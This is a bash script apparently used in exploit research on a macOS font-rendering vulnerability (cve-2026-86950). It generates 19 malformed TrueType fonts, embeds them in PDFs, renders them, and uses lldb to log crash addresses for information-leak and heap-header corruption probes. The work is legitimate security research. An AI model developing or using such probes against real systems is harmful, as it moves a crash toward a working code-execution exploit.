#!/bin/bash
# M4/M5/M6 fused: leak probes (output-diff), allocator header strikes (64-unit aligned), pc/execute forensics
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYEOF'
import sys, os
sys.path.insert(0, os.path.abspath('.'))
from gen_k2 import build_font
for L in (64, 8000, 16000, 24000, 25000, 26000, 27000, 27500, 27800, 27900,
          30720, 31104, 31360, 31616, 31744, 32000, 32256, 32512, 32768):
    build_font(f"k2_m{L}.ttf", L)
print("gen done: 19 variants")
PYEOF
for L in 64 8000 16000 24000 25000 26000 27000 27500 27800 27900 30720 31104 31360 31616 31744 32000 32256 32512 32768; do
  ./venv/bin/python gen_pdf.py k2_m${L}.pdf k2_m${L}.ttf
  ./render k2_m${L}.pdf >/dev/null 2>&1; RC=$?
  ./render2 k2_m${L}.pdf png_${L}.png >/dev/null 2>&1; RC2=$?
  MD5=$(md5 -q png_${L}.png 2>/dev/null || echo nopng)
  echo "m45 L=$L rc=$RC rc2=$RC2 md5=$MD5" >> m45_map.txt
  lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_m${L}.pdf" \
    -o "continue" -k "register read" -k "thread backtrace all" -o "quit" \
    ./render > m6_${L}.txt 2>&1 || true
  FA=$(grep -m1 "stop reason = EXC" m6_${L}.txt | sed 's/.*address=//;s/)//')
  PCSITE=$(grep -m1 "frame #0" m6_${L}.txt | sed 's/.*aa_cache_render/acr+/;s/).*/)/')
  echo "m6 L=$L fault=$FA site=$PCSITE" >> m45_map.txt
done
cat m45_map.txt
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/{m45_map.txt,m6_*.txt,png_*.png} findings/ 2>/dev/null
ls findings/ | wc -l
